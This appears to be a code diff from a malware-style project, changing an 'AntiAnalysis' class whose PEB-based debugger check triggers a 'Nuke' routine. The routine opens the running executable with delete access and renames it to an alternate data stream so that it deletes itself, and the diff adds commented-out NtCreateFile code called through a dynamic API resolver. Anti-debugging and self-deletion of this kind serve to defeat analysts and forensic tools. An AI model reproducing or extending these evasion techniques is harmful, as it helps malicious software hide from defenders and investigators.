@@ -37,7 +37,7 @@ bool AntiAnalysis::Peb(API::APIResolver& resolver)
 bool AntiAnalysis::PebCheck(API::APIResolver& resolver)
 {
     if (Peb(resolver)) {
-        MessageBoxA(NULL, "debugger", "debugger", NULL);
+        //MessageBoxA(NULL, "debugger", "debugger", NULL);
         this->Nuke(resolver);
         ExitProcess(0);
     }
@@ -51,6 +51,9 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
     FILE_DISPOSITION_INFO       dispinfo             = { 0 };
     HANDLE                      hFile                = INVALID_HANDLE_VALUE;
     PFILE_RENAME_INFO           pRename              = NULL;
+    NTSTATUS                    status;
+    OBJECT_ATTRIBUTES           object_attributes = { sizeof(OBJECT_ATTRIBUTES), nullptr, nullptr, 0, nullptr, nullptr };
+
 
     const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
 
@@ -79,6 +82,32 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
     
     
     hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL); // Open handle to current file
+
+    //UNICODE_STRING unicodePath;
+
+    //if (api.func.RtlInitUnicodeString)
+    //    api.func.RtlInitUnicodeString(&unicodePath, szPath);
+    //
+
+    ////RtlInitUnicodeString(&unicodePath, szPath);
+    //InitializeObjectAttributes(&object_attributes, &unicodePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+
+    //IO_STATUS_BLOCK io_status;
+    //status = api.func.pNtCreateFile(
+    //    &hFile,
+    //    FILE_GENERIC_READ | FILE_GENERIC_WRITE,
+    //    &object_attributes,
+    //    &io_status,
+    //    NULL,
+    //    FILE_ATTRIBUTE_NORMAL,
+    //    FILE_SHARE_READ | FILE_SHARE_WRITE,
+    //    FILE_OPEN,
+    //    FILE_NON_DIRECTORY_FILE,
+    //    NULL,
+    //    0 
+    //);
+    
 
     if (hFile == INVALID_HANDLE_VALUE) 
         return FALSE;
